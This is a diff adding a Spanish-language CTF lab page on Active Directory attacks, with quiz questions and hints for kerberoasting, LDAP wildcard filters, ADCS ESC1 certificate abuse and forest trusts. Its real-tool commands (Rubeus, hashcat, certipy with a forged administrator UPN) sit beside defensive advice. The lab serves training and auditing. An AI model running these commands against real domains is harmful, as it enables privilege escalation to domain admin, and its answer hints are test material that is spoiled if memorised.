@@ -1,0 +1,80 @@
+---
+index: 3
+title: "Lab: kerberoasting, ESC1 y el forest"
+questions:
+  - id: ad-avanzado-t03-q01
+    prompt: "Kerberoastea la cuenta de servicio con contraseña débil del lab (endpoint /kerberoast). Envía la flag."
+    hint: "curl 'http://127.0.0.1:18116/kerberoast?spn=BACKUP' — en producción: Rubeus kerberoast + hashcat -m 13100"
+    kind: flag
+  - id: ad-avanzado-t03-q02
+    prompt: "El LDAP del lab es inyectable: el filtro (samAccountName=svc-*) devuelve lo que no debía. Envía la flag."
+    hint: "curl 'http://127.0.0.1:18116/ldap/query?filter=(samAccountName=svc-*)' — el wildcard del filtro expone cuentas con notas internas"
+    kind: flag
+  - id: ad-avanzado-t03-q03
+    prompt: "Enumera los certificados (/adcs/templates) y abusa del ESC1 emitiendo un certificado con SAN administrator@corp.local. Envía la flag."
+    hint: "/adcs/enroll?template=CorpWebServer&san=administrator@corp.local — el template permite ENROLLEE_SUPPLIES_SUBJECT a Domain Users"
+    kind: flag
+  - id: ad-avanzado-t03-q04
+    prompt: "Revisa /trust: hay una confianza externa bidireccional. Envía su flag."
+    hint: "curl http://127.0.0.1:18116/trust — las externas bidireccionales permiten pivotar al otro bosque"
+    kind: flag
+---
+
+## El forest como campo de minas encadenable
+
+El lab simula corp.local con las rutas de ataque avanzadas — cada
+endpoint replica la petición que haría la herramienta real:
+
+```bash
+cd labs/ad-forest-lab && cp flags.env.example flags.env
+docker compose --env-file flags.env up -d
+# http://127.0.0.1:18116
+```
+
+### Kerberoasting (el clásico que nunca muere)
+
+```bash
+curl -s "http://127.0.0.1:18116/kerberoast?spn=BACKUP" | jq .
+```
+
+Cualquier usuario de dominio puede pedir un TGS de cualquier SPN; el
+ticket se cifra con la clave de la CUENTA — si la contraseña es débil,
+se crackea offline. Equivalente real:
+
+```powershell
+Rubeus.exe kerberoast /format:hashcat
+hashcat -m 13100 hashes.txt rockyou.txt
+```
+
+La defensa: contraseñas de servicio de 25+ chars aleatorios (o gMSA) y
+cifrado AES solo.
+
+### ESC1: el certificado que te hace admin
+
+```bash
+curl -s http://127.0.0.1:18116/adcs/templates | jq '.templates[] | select(.esc)'
+curl -s "http://127.0.0.1:18116/adcs/enroll?template=CorpWebServer&san=administrator@corp.local"
+```
+
+El template `CorpWebServer` permite al solicitante ELEGIR el SAN y
+Domain Users puede enrolar: pides un certificado cuya "identidad" es
+administrator. Con `certipy` real: `certipy req -ca CORP-CA -template
+CorpWebServer -upn administrator@corp.local` y luego autenticas con ese
+certificado (pass-the-cert) sin tocar la contraseña del admin.
+
+### Los trusts: la puerta lateral
+
+`/trust` muestra dos relaciones: parent-child con dev.corp.local (sin
+SID filtering — explotable con SID History) y una externa
+BIDIRECCIONAL con partner.external. En un engagement real, esa segunda
+equivale a "si comprometo el bosque partner, tengo entrada aquí", y
+viceversa. `Get-ADTrust -Filter *` y las alertas de SID History
+anómalo son la rutina de auditoría.
+
+## Cadena completa del room
+
+kerberoast (credencial de servicio) → acceso como svc-backup → su
+delegación (S4U) o su derecho de enrolar el certificado ESC1 → admin de
+dominio → trust → el otro bosque. AD avanzado no es un bug: es una
+COLA de pequeñas delegaciones que nadie revistó juntas. Lockhart
+audita delegaciones, templates y trusts exactamente por eso.
